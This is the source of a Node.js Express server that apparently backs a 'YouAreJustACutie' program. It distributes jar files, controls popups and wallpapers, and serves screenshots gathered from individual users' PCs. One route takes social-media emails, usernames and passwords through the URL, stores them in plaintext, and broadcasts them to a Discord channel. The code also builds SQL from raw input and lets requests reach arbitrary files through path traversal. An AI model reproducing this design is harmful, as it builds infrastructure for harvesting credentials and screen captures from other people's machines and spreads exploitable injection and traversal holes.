import http from 'http';
import express from 'express';
import fs from 'fs';
import path from 'path';
import sqlite3 from 'sqlite3';
import execPhp from 'exec-php';
import { client, guild } from './discordBot/main.mjs';
import { EmbedBuilder } from 'discord.js';

const app = express();
const server = http.createServer(app);


const database = new sqlite3.Database("passwords.db", sqlite3.OPEN_READWRITE | sqlite3.OPEN_CREATE, (err) => {
    if (err && err.code == "SQLITE_CANTOPEN") {
        console.error("Can not create or open database");
        return;
    } else if (err) {
        console.error(`Can not create or open database : ${err.toString()}`);
    }
});


let createTables = fs.readFileSync("tablesCreation.sql", 'utf8');
database.exec(createTables, (err) => {
    if(err) {
        console.error(`Can not create tables : ${err.toString()}`);
        return;
    } else console.log("Database state updated.");
});



app.use(express.static('/public'));

app.get('/', (req, res) => {
    res.send('Hello World');
});


// Related to Synced Program
app.get('/downloadSynced', (req, res) => {
    res.download("build/SyncedCuties.jar");
});


let dateOfNewPopup = new Date();

app.get('/setPopupCooldown/:timeBeforeNext', (req, res) => {
    const [hours, minutes, seconds] = req.params.timeBeforeNext.split(':').map(Number);
    const now = new Date();
    dateOfNewPopup = new Date(now.getTime() + hours * 3600000 + minutes * 60000 + seconds * 1000);
    res.send(`Popup cooldown set for ${hours} hours, ${minutes} minutes, and ${seconds} seconds from now.`);
});

app.get('/getPopupCooldown', (req, res) => {
    const now = new Date();
    let diff = dateOfNewPopup - now;
    if (diff < 0) diff = 0;

    const hours = Math.floor(diff / (1000 * 60 * 60));
    const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
    const seconds = Math.floor((diff % (1000 * 60)) / 1000);

    const html = `
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Popup Cooldown Timer</title>
        <style>
            body {
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                font-family: Arial, sans-serif;
                background-color: #f0f0f0;
            }
            #timer {
                font-size: 48px;
                background-color: #ffffff;
                padding: 20px;
                border: 1px solid #ddd;
                border-radius: 10px;
                box-shadow: 0 0 10px rgba(0,0,0,0.1);
            }
        </style>
    </head>
    <body>
        <div id="timer">${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}</div>
        <script>
            let remainingTime = ${diff};

            function startTimer() {
                const timer = document.getElementById('timer');

                function updateTimer() {
                    if (remainingTime <= 0) {
                        timer.innerHTML = "00:00:00";
                        return;
                    }
                    
                    remainingTime -= 1000;

                    const hours = Math.floor(remainingTime / (1000 * 60 * 60));
                    const minutes = Math.floor((remainingTime % (1000 * 60 * 60)) / (1000 * 60));
                    const seconds = Math.floor((remainingTime % (1000 * 60)) / 1000);

                    timer.innerHTML = 
                        hours.toString().padStart(2, '0') + ":" +
                        minutes.toString().padStart(2, '0') + ":" +
                        seconds.toString().padStart(2, '0');
                }

                setInterval(updateTimer, 1000);
            }

            window.onload = startTimer;
        </script>
    </body>
    </html>
    `;
    res.send(html);
});




// Related to YouAreJustACutie Program

app.get('/download', (req, res) => {
    res.download("build/YouAreJustACutie.jar");
});

app.get('/downloadPopupAndWallpaper', (req, res) => {
    res.download("build/YouAreJustACutie-PopupsWallpaper.jar");
});





app.get('/wallpaper', (req, res) => {
    const files = fs.readdirSync(path.join('public'));
    const randomFile = files[Math.floor(Math.random() * files.length)];
    res.redirect(`/images/${randomFile}`);
});

app.get('/getRandomImage', (req, res) => {
    const files = fs.readdirSync(path.join('public'));
    const randomFile = files[Math.floor(Math.random() * files.length)];
    res.send(randomFile);
});

app.get('/getRandomScreenshot', (req, res) => {
    const folders = fs.readdirSync(path.join('..', 'cuties'));
    let dates = [];
    for(let i=0; i<folders.length; i++) {
        if(folders[i].startsWith(".")) continue;
        let folderStats = fs.statSync("../cuties/" + folders[i]);
        if(folderStats.isDirectory()) dates.push(folders[i]);
    }

    const choosenDate = dates[Math.floor(Math.random() * dates.length)];
    const cutiesPCs = fs.readdirSync(path.join('..', 'cuties', choosenDate));
    let randomCutie;
    let choosenCutieScreenShots = [];
    
    do {
        randomCutie = cutiesPCs[Math.floor(Math.random() * cutiesPCs.length)];
        choosenCutieScreenShots = fs.readdirSync(path.join('..', 'cuties', choosenDate, randomCutie, "screenshots"));
    } while(choosenCutieScreenShots.length == 0);

    const randomScreenshot = choosenCutieScreenShots[Math.floor(Math.random() * choosenCutieScreenShots.length)];

    res.send({ choosenDate: choosenDate, cutie: randomCutie, screenshot: randomScreenshot });
});

app.get('/images/:image', (req, res) => { res.download(path.join('public', req.params.image)); });
app.get('/screenshot/:choosenDate/:cutie/:screenshot', (req, res) => { res.download(path.join('..', 'cuties', req.params.choosenDate, req.params.cutie, "screenshots", req.params.screenshot)); });


app.get('/social/:social', (req, res) => {
    switch(req.params.social) {
        case "Discord":
            res.download("socials/discord.png");
            break;
        case "Facebook":
            res.download("socials/facebook.png");
            break;
        case "Instagram":
            res.download("socials/instagram.jpg");
            break;
        case "Snapchat":
            res.download("socials/snapchat.jpg");
            break;
        case "Twitter":
            res.download("socials/twitter.jpg");
            break;
        case "Twitch":
            res.download("socials/twitch.png");
            break;
        case "Google":
            res.download("socials/google.png");
            break;
    }
});


app.get('/addSocial/:social/:email/:username/:password/:discordUsername', (req, res) => {
    console.log(req.params);
    database.exec(`INSERT INTO accounts (social, email, username, password) VALUES ('${req.params.social}','${req.params.email}','${req.params.username}','${req.params.password}')`, (err) => {
        if(err) {
            console.error(`Can not insert data : ${err.toString()}`);
            return;
        } else console.log("Data inserted.");
    });

    const accountEmbed = new EmbedBuilder()
	.setColor(0x0099FF)
	.setTitle('A new account is shared')
    .setDescription(`${req.params.discordUsername} shared a new account :3`)
	.setThumbnail(`http://cuties.vps.boxtoplay.com:1570/social/${req.params.social}`)
	.addFields(
		{ name: 'Social : ', value: req.params.social },
		{ name: '\u200B', value: '\u200B' },
		{ name: 'Username : ', value: req.params.username },
		{ name: 'Email : ', value: req.params.email},
        { name: 'Password : ', value: req.params.password}
	)
	// .setImage('https://i.imgur.com/AfFp7pu.png')
	.setTimestamp()
	.setFooter({ text: 'Thank you cutie ❤' });

    const channel = guild.channels.cache.get('1228365375520116757');
    channel.send({ embeds: [accountEmbed] });
    res.send("Data inserted.");
});

app.get('/displaySocials', async (req, res) => {
    const phpFile = path.join('showSocials.php');

    const phpOutput = await execPhp(phpFile, (error, php, output) => {
        if(error) {
            console.error(`Can not execute php file : ${error.toString()}`);
            return;
        }
        res.send(output);
    });
});

app.get('/randomLink', (req, res) => {
    const linksFile = fs.readFileSync('links.txt', 'utf8');

    const links = linksFile.split('\n');
    const randomLink = links[Math.floor(Math.random() * links.length)];
    res.send(randomLink);
});


server.listen(1570, () => {
    console.log(`Server running on port 1570`);
});